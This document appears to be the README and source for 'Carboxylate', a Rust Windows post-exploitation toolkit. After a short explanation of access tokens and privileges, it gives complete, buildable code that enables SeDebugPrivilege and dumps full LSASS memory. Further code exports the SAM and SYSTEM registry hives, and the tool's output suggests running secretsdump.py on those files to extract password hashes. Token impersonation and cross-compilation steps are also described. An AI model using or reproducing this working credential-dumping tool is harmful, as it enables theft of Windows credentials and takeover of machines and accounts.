# Concepts

Windows is built around a few core security concepts:
### **Access Tokens**

Every running process in Windows has an **access token** attached to it that defines:

- **Who** the process is running as (user SID)    
- **What groups** it belongs to (Administrators, SYSTEM, etc.)
- **Which privileges** it holds (SeDebugPrivilege, SeBackupPrivilege, SeImpersonatePrivilege…)
### 2. **Privileges vs Permissions**

These are different:

- **Permissions** → Access to specific objects (files, registry keys, processes).
- **Privileges** → Special OS-level powers (debugging other processes, backing up registry, impersonating users).
### 3. **Elevation (Admin vs Standard User)**

When Windows says a process is **elevated**, it means:

- It is running with the **Administrator token**, not the limited user token.
- UAC splits tokens:
    
    - **Filtered token** → normal apps
    - **Full admin token** → elevated apps (which our `is_elevated()` implements)
# LSASS Dumper

**LSASS (Local Security Authority Subsystem Service)** is a protected Windows process that:

- Authenticates logons
- Stores credential material in memory
- Enforces security policy

**File:** `src/lsass_dumper.rs`

1. Confirm the current process is running with **elevated** rights (`is_elevated()` checks `TokenElevation` via `GetTokenInformation`).
2. Attempt to enable a specific privilege in the current process token (`enable_debug_privilege()` enables `SeDebugPrivilege` using `LookupPrivilegeValueW` + `AdjustTokenPrivileges`).
3. Locate a target process by enumerating processes (`CreateToolhelp32Snapshot` + `Process32FirstW`/`Process32NextW`).
4. Open the target process (`OpenProcess`) and write a dump using a debug helper API (`MiniDumpWriteDump` is declared as an FFI import and linked via `dbghelp`).
# SAM + SYSTEM Hive Export 
### What the Registry Hives Are

Windows stores configuration in **registry hives**, including:

- **SAM** → local user account database
- **SYSTEM** → boot key + system secrets

These files are normally **locked** while Windows runs.

**File:** `src/sam_dumper.rs`

This module exports registry hives to disk using Win32 registry APIs:

1. Confirm elevation (`is_elevated()` again checks `TokenElevation`).
2. Enable `SeBackupPrivilege` (`enable_backup_privilege()` uses `AdjustTokenPrivileges`).
3. Export selected hives with:
   - `RegOpenKeyExW(HKEY_LOCAL_MACHINE, ...)`
   - `RegSaveKeyW(...)`

There is also a small quality-of-life step:

- `DeleteFileW(...)` is called before saving so the export doesn’t fail if a previous output file exists.

Exporting local registry hives that back account databases is a common precursor to **offline credential extraction**. Even if the extraction happens elsewhere, the hive export is often the observable event on the endpoint.
# Token Impersonation 

Windows allows one process to:

Temporarily act as another user **if it has permission**.

This is controlled by **SeImpersonatePrivilege**.
### Token Duplication Flow

1. **Find a process**
    - Enumerate running processes
2. **Open its token**
    - Requires rights granted by the kernel
3. **Duplicate the token**
    - Create a **primary token** usable for a new process
4. **Create a process with that identity**
    - Windows launches a new process
    - Security context = duplicated token

This is how services run things as:

- SYSTEM
- NetworkService
- Logged-in users

**File:** `src/token_impersonator.rs`

This module demonstrates how Windows security tokens can be used to create a process under another identity when the caller has appropriate rights. In code terms, it:

1. Verifies `SeImpersonatePrivilege` is available (`PrivilegeCheck` against the current process token).
2. Enumerates processes and resolves “owner” names:
   - Process list via `CreateToolhelp32Snapshot` + `Process32FirstW`/`Process32NextW`
   - Owner SID via `GetTokenInformation(TokenOwner, ...)`
   - SID to `DOMAIN\\User` via `LookupAccountSidW`
3. Opens the target process token and duplicates it:
   - `OpenProcessToken(..., TOKEN_DUPLICATE, ...)`
   - `DuplicateTokenEx(..., TokenPrimary, ...)`
4. Creates a new process using the duplicated token (`CreateProcessWithTokenW`).
# Carboxylate: `main.rs` 

This section documents the **entry point** of the project: `src/main.rs`.

At the top of `src/main.rs`, Carboxylate conditionally compiles feature modules:

- `lsass_dumper`
- `sam_dumper`
- `token_impersonator`

The pattern used is:

```rust
#[cfg(windows)]
mod lsass_dumper;
```

Why this matters:

- It prevents the project from failing to build on non-Windows platforms due to missing Win32 APIs.
- It makes it explicit which parts of the codebase depend on Windows internals.

Carboxylate also defines **Windows and non-Windows handler implementations**. On non-Windows targets, the handlers simply print a message like “only supported on Windows” instead of attempting to do anything.

`print_help()` prints a fixed list of supported commands:

- `dumplsass`
- `dumpsam`
- `impersonate`
- `help`
- `exit`

Each command has a handler function:

- `handle_lsass_dump()`
- `handle_sam_dump()`
- `handle_token_impersonation()`

`run_command(cmd: &str)` is the command router:

```rust
fn run_command(cmd: &str) {
    match cmd {
        "dumplsass" => handle_lsass_dump(),
        "dumpsam" => handle_sam_dump(),
        "impersonate" => handle_token_impersonation(),
        "help" => print_help(),
        _ => println!("  [?] Unknown command. Type 'help' for options."),
    }
}
```

```rust
#[cfg(windows)]
mod lsass_dumper;
#[cfg(windows)]
mod sam_dumper;
#[cfg(windows)]
mod token_impersonator;

use std::io::{self, Write};

const BANNER: &str = r#"
   ____            _                      _       _
  / ___|__ _ _ __ | |__   _____  ___   _| | __ _| |_ ___
 | |   / _` | '_ \| '_ \ / _ \ \/ / | | | |/ _` | __/ _ \
 | |__| (_| | |  | | |_) | (_) >  <| |_| | | (_| | ||  __/
  \____\__,_|_|  |_|_.__/ \___/_/\_\\__, |_|\__,_|\__\___|
                                    |___/

  Windows Post-Exploitation Toolkit
  Type 'help' for available commands.
"#;

fn print_help() {
    println!();
    println!("  Commands:");
    println!("  -----------------------------------------");
    println!("  dumplsass          Dump LSASS process memory");
    println!("  dumpsam            Dump SAM & SYSTEM registry hives");
    println!("  impersonate        Impersonate a process token");
    println!("  help               Show this help menu");
    println!("  exit               Exit Carboxylate");
    println!();
}

#[cfg(windows)]
fn handle_lsass_dump() {
    if !lsass_dumper::is_elevated() {
        eprintln!("  [-] Not running with elevated privileges");
        return;
    }
    println!("  [+] Running with elevated privileges");

    if !lsass_dumper::enable_debug_privilege() {
        eprintln!("  [-] Failed to enable SeDebugPrivilege");
        return;
    }
    println!("  [+] SeDebugPrivilege enabled");

    let pid = match lsass_dumper::get_process_id_by_name("lsass.exe") {
        Some(p) => p,
        None => {
            eprintln!("  [-] Could not find lsass.exe");
            return;
        }
    };
    println!("  [+] Found lsass.exe (PID: {})", pid);

    if lsass_dumper::dump_to_file(pid, "lsass.dmp") {
        println!("  [+] LSASS dumped to lsass.dmp");
    } else {
        eprintln!("  [-] Failed to dump LSASS");
    }
}

#[cfg(windows)]
fn handle_sam_dump() {
    if !sam_dumper::is_elevated() {
        eprintln!("  [-] Not running with elevated privileges");
        return;
    }
    println!("  [+] Running with elevated privileges");

    if !sam_dumper::enable_backup_privilege() {
        eprintln!("  [-] Failed to enable SeBackupPrivilege");
        return;
    }
    println!("  [+] SeBackupPrivilege enabled");

    if sam_dumper::dump_sam_and_system("sam.save", "system.save") {
        println!("  [+] SAM hive saved to sam.save");
        println!("  [+] SYSTEM hive saved to system.save");
        println!("  [*] Extract hashes with:");
        println!("      secretsdump.py -sam sam.save -system system.save LOCAL");
    } else {
        eprintln!("  [-] SAM dump incomplete (check errors above)");
    }
}

#[cfg(windows)]
fn handle_token_impersonation() {
    if !token_impersonator::has_impersonate_privilege() {
        eprintln!("  [-] SeImpersonatePrivilege not available");
        return;
    }
    println!("  [+] SeImpersonatePrivilege is enabled\n");

    let processes = token_impersonator::enumerate_processes();

    println!("  PID\tOwner");
    println!("  ---\t-----");
    for proc in &processes {
        println!("  {}\t{}", proc.pid, proc.domain_user_name);
    }

    print!("\n  Enter PID to impersonate: ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();

    let target_pid: u32 = match input.trim().parse() {
        Ok(p) => p,
        Err(_) => {
            eprintln!("  [-] Invalid PID");
            return;
        }
    };

    match token_impersonator::impersonate_and_spawn(target_pid, "cmd.exe") {
        Some(spawned_pid) => println!("  [+] Spawned cmd.exe with PID: {}", spawned_pid),
        None => eprintln!("  [-] Failed to impersonate token"),
    }
}

#[cfg(not(windows))]
fn handle_lsass_dump() {
    eprintln!("  [-] LSASS dump is only supported on Windows");
}

#[cfg(not(windows))]
fn handle_sam_dump() {
    eprintln!("  [-] SAM dump is only supported on Windows");
}

#[cfg(not(windows))]
fn handle_token_impersonation() {
    eprintln!("  [-] Token impersonation is only supported on Windows");
}

fn run_command(cmd: &str) {
    match cmd {
        "dumplsass" => handle_lsass_dump(),
        "dumpsam" => handle_sam_dump(),
        "impersonate" => handle_token_impersonation(),
        "help" => print_help(),
        _ => println!("  [?] Unknown command. Type 'help' for options."),
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    // One-shot mode
    if args.len() >= 2 {
        run_command(&args[1]);
        return;
    }

    // Interactive shell
    print!("{}", BANNER);

    let stdin = io::stdin();
    loop {
        print!("  Carboxylate > ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        if stdin.read_line(&mut input).unwrap() == 0 {
            break;
        }

        let cmd = input.trim();
        if cmd.is_empty() {
            continue;
        }

        if cmd == "exit" || cmd == "quit" {
            break;
        }

        run_command(cmd);
        println!();
    }
}
```

# Carboxylate: `lsass_dumper.rs`

`lsass.exe` is a sensitive security process and “dump LSASS” behavior is widely associated with credential theft. 

`src/lsass_dumper.rs` implements:

- `to_wide(s: &str) -> Vec<u16>`: UTF-16 conversion helper for WinAPI “W” functions.
- `SafeHandle`: an RAII wrapper that closes a Win32 `HANDLE` automatically (`Drop` calls `CloseHandle`).
- `is_elevated() -> bool`: checks if the current process token is elevated via `GetTokenInformation(TokenElevation, ...)`.
- `get_process_id_by_name(name: &str) -> Option<u32>`: enumerates processes via Toolhelp snapshot APIs and returns the PID of a matching executable name.
- `enable_debug_privilege() -> bool`: attempts to enable a named token privilege on the current process (in this file: `SeDebugPrivilege`).
- `dump_to_file(pid: u32, output_path: &str) -> bool`: opens an output file handle, opens the target process handle, and calls a dump-writing API (declared via FFI).

**Resource Acquisition Is Initialization** **(RAII)** is a core principle of its memory and resource management system. The language's ownership model, enforced at compile time, ensures that a resource's lifecycle is tied to the lifetime of the variable that owns it, automatically releasing the resource when the variable goes out of scope. The **Foreign Function Interface (FFI)** in Rust is a mechanism that enables code written in Rust to interact with code written in other programming languages, most commonly C. It serves as a "universal translator" to leverage existing libraries, optimize performance, or integrate with platform-specific API.

```c
use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use winapi::shared::minwindef::BOOL;
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, CREATE_ALWAYS};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcess, OpenProcessToken};
use winapi::um::securitybaseapi::{AdjustTokenPrivileges, GetTokenInformation};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, GENERIC_ALL, HANDLE, LUID, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_ELEVATION, TOKEN_PRIVILEGES, TOKEN_QUERY,
    TokenElevation,
};

const MINIDUMP_WITH_FULL_MEMORY: DWORD = 0x00000002;

// winapi 0.3 doesn't expose MiniDumpWriteDump directly; declare the FFI here.
// We only ever pass NULL for the optional struct pointers, so use c_void.
#[link(name = "dbghelp")]
extern "system" {
    fn MiniDumpWriteDump(
        hProcess: HANDLE,
        ProcessId: DWORD,
        hFile: HANDLE,
        DumpType: DWORD,
        ExceptionParam: *const core::ffi::c_void,
        UserStreamParam: *const core::ffi::c_void,
        CallbackParam: *const core::ffi::c_void,
    ) -> BOOL;
}

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

pub struct SafeHandle(HANDLE);

impl SafeHandle {
    pub fn new(h: HANDLE) -> Self {
        SafeHandle(h)
    }

    pub fn raw(&self) -> HANDLE {
        self.0
    }

    pub fn is_valid(&self) -> bool {
        !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE
    }
}

impl Drop for SafeHandle {
    fn drop(&mut self) {
        if self.is_valid() {
            unsafe {
                CloseHandle(self.0);
            }
        }
    }
}

pub fn is_elevated() -> bool {
    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == FALSE {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut elevation: TOKEN_ELEVATION = mem::zeroed();
        let mut size: DWORD = mem::size_of::<TOKEN_ELEVATION>() as DWORD;

        if GetTokenInformation(
            token.raw(),
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        ) == FALSE
        {
            return false;
        }

        elevation.TokenIsElevated != 0
    }
}

pub fn get_process_id_by_name(name: &str) -> Option<u32> {
    let target: Vec<u16> = to_wide(name);

    unsafe {
        let snapshot = SafeHandle::new(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        if !snapshot.is_valid() {
            return None;
        }

        let mut entry: PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot.raw(), &mut entry) == FALSE {
            return None;
        }

        loop {
            let exe_name: Vec<u16> = entry
                .szExeFile
                .iter()
                .take_while(|&&c| c != 0)
                .copied()
                .chain(std::iter::once(0))
                .collect();

            if exe_name == target {
                return Some(entry.th32ProcessID);
            }

            if Process32NextW(snapshot.raw(), &mut entry) == FALSE {
                break;
            }
        }

        None
    }
}

pub fn enable_debug_privilege() -> bool {
    let priv_name = to_wide("SeDebugPrivilege");

    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == FALSE {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut luid: LUID = mem::zeroed();
        if LookupPrivilegeValueW(ptr::null(), priv_name.as_ptr(), &mut luid) == FALSE {
            return false;
        }

        let mut tp: TOKEN_PRIVILEGES = mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(token.raw(), FALSE, &mut tp, 0, ptr::null_mut(), ptr::null_mut())
            == FALSE
        {
            return false;
        }

        GetLastError() == 0
    }
}

pub fn dump_to_file(pid: u32, output_path: &str) -> bool {
    let path_wide = to_wide(output_path);

    unsafe {
        let file_handle = SafeHandle::new(CreateFileW(
            path_wide.as_ptr(),
            GENERIC_ALL,
            0,
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        ));

        if !file_handle.is_valid() {
            eprintln!("  [-] Failed to create output file");
            return false;
        }

        let access = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
        let process = SafeHandle::new(OpenProcess(access, FALSE, pid));

        if !process.is_valid() {
            eprintln!("  [-] Failed to open target process");
            return false;
        }

        let result = MiniDumpWriteDump(
            process.raw(),
            pid,
            file_handle.raw(),
            MINIDUMP_WITH_FULL_MEMORY,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );

        result != FALSE
    }
}
```
# Carboxylate: `sam_dumper.rs`

Exporting `HKLM\\SAM` and `HKLM\\SYSTEM` is commonly used as a precursor to offline credential extraction.

`src/sam_dumper.rs` implements:

- `to_wide(s: &str) -> Vec<u16>`: UTF-16 conversion helper (same pattern as other modules).
- `is_elevated() -> bool`: checks elevation via `GetTokenInformation(TokenElevation, ...)`.
- `enable_backup_privilege() -> bool`: enables `SeBackupPrivilege` on the current token via `AdjustTokenPrivileges`.
- `save_hive(sub_key: &str, output_path: &str) -> bool`: opens `HKLM\\<sub_key>` and saves it via `RegSaveKeyW`.
- `dump_sam_and_system(sam_path, system_path) -> bool`: saves both SAM and SYSTEM and returns whether both succeeded.

```rust
use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use winapi::shared::minwindef::{DWORD, HKEY};
use winapi::shared::winerror::ERROR_SUCCESS;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::DeleteFileW;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::{AdjustTokenPrivileges, GetTokenInformation};
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::winnt::{
    HANDLE, KEY_READ, LUID, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_ELEVATION,
    TOKEN_PRIVILEGES, TOKEN_QUERY, TokenElevation,
};
use winapi::um::winreg::{
    RegCloseKey, RegOpenKeyExW, RegSaveKeyW, HKEY_LOCAL_MACHINE,
};

use crate::lsass_dumper::SafeHandle;

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

pub fn is_elevated() -> bool {
    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut elevation: TOKEN_ELEVATION = mem::zeroed();
        let mut size: DWORD = mem::size_of::<TOKEN_ELEVATION>() as DWORD;

        if GetTokenInformation(
            token.raw(),
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        ) == 0
        {
            return false;
        }

        elevation.TokenIsElevated != 0
    }
}

pub fn enable_backup_privilege() -> bool {
    let priv_name = to_wide("SeBackupPrivilege");

    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == 0 {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut luid: LUID = mem::zeroed();
        if LookupPrivilegeValueW(ptr::null(), priv_name.as_ptr(), &mut luid) == 0 {
            return false;
        }

        let mut tp: TOKEN_PRIVILEGES = mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(token.raw(), 0, &mut tp, 0, ptr::null_mut(), ptr::null_mut()) == 0
        {
            return false;
        }

        GetLastError() == ERROR_SUCCESS
    }
}

fn save_hive(sub_key: &str, output_path: &str) -> bool {
    let sub_key_wide = to_wide(sub_key);
    let output_wide = to_wide(output_path);

    unsafe {
        // Delete existing file so RegSaveKeyW doesn't fail
        DeleteFileW(output_wide.as_ptr());

        let mut hkey: HKEY = ptr::null_mut();
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key_wide.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        );

        if status != ERROR_SUCCESS as i32 {
            eprintln!("  [-] Failed to open {} (error: {})", sub_key, status);
            return false;
        }

        let status = RegSaveKeyW(hkey, output_wide.as_ptr(), ptr::null_mut());
        RegCloseKey(hkey);

        if status != ERROR_SUCCESS as i32 {
            eprintln!("  [-] Failed to save {} (error: {})", sub_key, status);
            return false;
        }

        true
    }
}

pub fn dump_sam_and_system(sam_path: &str, system_path: &str) -> bool {
    let sam_ok = save_hive("SAM", sam_path);
    let sys_ok = save_hive("SYSTEM", system_path);
    sam_ok && sys_ok
}
```
# Carboxylate: `token_impersonator.rs`

`src/token_impersonator.rs` contains:

- String helpers:
  - `to_wide()` for UTF-16 WinAPI calls
  - `wide_to_string()` for converting returned UTF-16 buffers into Rust `String`
- Data model:
  - `ProcessInfo { pid, domain_user_name, process_name }`
- Core functions:
  - `has_impersonate_privilege() -> bool`
  - `enumerate_processes() -> Vec<ProcessInfo>`
  - `impersonate_and_spawn(target_pid, process_to_launch) -> Option<u32>`
- Internal helper:
  - `get_process_owner(pid) -> Option<String>`

It also reuses `SafeHandle` from `src/lsass_dumper.rs` for automatic handle cleanup.
# Compilation

```powershell
cd Carboxylate-Rust
cargo build --release

Output:

- target\release\carboxylate.exe
```

```bash
## Cross-compile from Linux

cd Carboxylate-Rust
rustup target add x86_64-pc-windows-gnu
sudo apt install mingw-w64
cargo build --release --target x86_64-pc-windows-gnu

Output:

- target/x86_64-pc-windows-gnu/release/carboxylate.exe
```

---

